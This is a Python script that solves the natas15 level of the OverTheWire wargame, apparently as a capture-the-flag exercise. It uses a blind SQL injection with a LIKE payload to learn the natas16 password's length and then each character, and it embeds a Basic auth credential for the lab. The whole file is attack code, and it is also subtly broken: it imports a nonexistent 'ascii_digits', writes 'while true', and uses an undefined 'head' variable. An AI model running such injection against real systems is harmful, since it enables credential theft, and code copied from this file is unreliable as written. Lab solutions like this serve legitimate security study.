from string import ascii_letters
from string import ascii_digits
from time import sleep
from requests import get
from requests.auth import HTTPBasicAuth
from urllib.parse import quote
from bs4 import BeautifulSoup

alpha_numeric = ascii_letters+ascii_digits
strained_chars = '' 
delay=0.1

#Quali di questi header sono fondamentali?
header={'Host': 'natas15.natas.labs.overthewire.org'\
,'Accept-Encoding': 'gzip, deflate'\
,'DNT': '1'\
,'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg'}

incomplete_injection = 'natas16" and password like \''

password_length = 0

#Codice per trovare la lunghezza della password
while true:
    password_length += 1
    print( 'Testing password of '+str( password_length )+' chars' )
    incomplete_injection = incomplete_injection + '_'
    injection = incomplete_injection + '\';# '
    
    injection = quote( injection,safe= '')
    url = 'http://natas15.natas.labs.overthewire.org/?username='+ injection
    
    req = get( url, headers= header )
    soup = BeautifulSoup( req.text, 'html.parser' )
    search_output= soup.body.div.next.string
    
    if(search_output=='\r\nThis user exists.'):
        break
    elif(search_output=='\r\nThis user doesn\'t exist.'):
        print('not this length...skipping')
    else:
        print('########## GENERIC ERROR ##########')
        break

    sleep( delay )

print( 'Seems that the password is '+str( password_length )+' chars long' )


password=''


for i in range( password_length ):
    #specificare l'utilizzo di binary     
    payload = 'natas16" and password like binary \''

    for char in alpha_numeric:
        print('Testing char '+char+' for position '+str(i))
        payload2=payload+password+char
        if(i!=password_length-1):
            for j in range(password_length-i-1):
                payload2= payload2+'_'

        payload2= payload2+'\';# '
        print('Testing '+payload2)
        payload2 = quote(payload2,safe='')
        link='http://natas15.natas.labs.overthewire.org/?username='+payload2
    
        req = get(link, headers=head)
        soup = BeautifulSoup(req.text, 'html.parser')
        search_output= soup.body.div.next.string
    
        if(search_output=='\r\nThis user exists.'):
            password=password+char
            print('#### We have char of position '+str(i)+': '+char)
            break
        elif(search_output=='\r\nThis user doesn\'t exist.'):
            print('not this char...skipping')
        else:
            print('########## GENERIC ERROR ##########')
            exit(1)

        sleep(.100)

print('We have the password! Here it is: '+password)

